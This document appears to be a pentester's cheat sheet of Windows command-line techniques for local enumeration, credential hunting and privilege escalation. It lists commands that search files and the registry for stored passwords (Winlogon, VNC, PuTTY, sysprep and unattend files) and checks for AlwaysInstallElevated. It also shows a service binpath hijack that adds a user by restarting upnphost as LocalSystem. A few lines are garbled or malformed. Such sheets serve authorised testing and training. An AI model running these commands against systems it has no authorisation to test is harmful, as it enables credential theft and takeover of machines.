# builtin commands
- find files
  ~~~cmd
  dir /s /b network-secret.txt

  dir /q calc.exe //display ownership
  dir /a:d calc.exe
  # d: Directories
  # h: Hidden files
  # s: System files

  dir /s pass == cred == vnc == .config
  findstr /si password *.xml *.ini *.txt *.bat
  ~~~

- Network
  ~~~sh
  # Show all listening ports
  netstat -aon | find /i "listening" | findstr 127.0.0.1
  netstat -an | find /i "Listening"
  netstat -an | find /i "Established"

  # with PID
  netstat -abno

  type C:\Windows\system32\drivers\etc\hosts
    type c:\Winnt\system32\drivers\etc\hosts   # Windows 2000

  arp -a
  routeprint
  # From WinXP upwards
  netsh firewall show state
  netsh firewall show config

  ~~~

- Systems
  ~~~sh
  wmic os get osarchitecture
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
  systeminfo
  echo %USERDOMAIN%\%USERNAME% # later win7 or win2008
  ~~~

- Windows services
  ~~~sh
  tasklist /svc
  schtasks /query /fo LIST /v
  # Queries the configuration information for a specified service.
  sc qc <service_name>

  # Change the upnp service binary
  sc qc upnphostsc config upnphost binpath= "net user /add"
  sc config upnphost obj= ".\LocalSystem" password =""
  net stop upnphost
  net start upnphost
  ~~~

- check security policy
  ~~~sh
  net accounts
  ~~~

- list users
  ~~~sh
  net users

  WMIC /NODE: "BOB" COMPUTERSYSTEM GET USERNAME # needs admin

  net user %username% /domain | find "Group"
  ~~~

- check cacls
  ~~~sh
  #list privileges via cmd
  cacls *
  cacls "C:\Program Files" /T | findstr Users
  # lists permissions of *.exe and searches for the user and his full permissions string "IUSR_BOB:F".
  cacls *.exe | findstr "IUSR_BOB:F"
  ~~~

- check registory
  ~~~sh
  #search for passwords in the Windows Registry
  reg query "HKLM\Software\Microsoft\WindowsNT\Currentversion\Winlogon"
  reg query "HKLM\System\CurrentControlSet\Services\SNMP"

  reg query "HKCU\Software\ORL\WinVNC3\Password"
  # UAC check
  REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
    #EnableLUA    REG_DWORD    0x0  // NO
    #EnableLUA    REG_DWORD    0x1  // YES

  reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

  reg query HKLM /f password /t REG_SZ /s
  reg query HKCU /f password /t REG_SZ /s

  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
  ~~~

- search credentials
  ~~~sh
  dir c:\unattend.xml
  type c:\sysprep.inf
  type c:\sysprep\sysprep.xml
  dir c:\*vnc.ini /s /b
  dir c:\*ultravnc.ini /s /b
  dir c:\ /s /b | findstr /si *vnc.ini

  cd c:\
  findstr /S pass *.txt *.xml *.ini
  ~~~

- Copy
  ~~~sh
  copy FreeSSHDService.ini c:\"Program Files"\freeSSHd /y
  ~~~

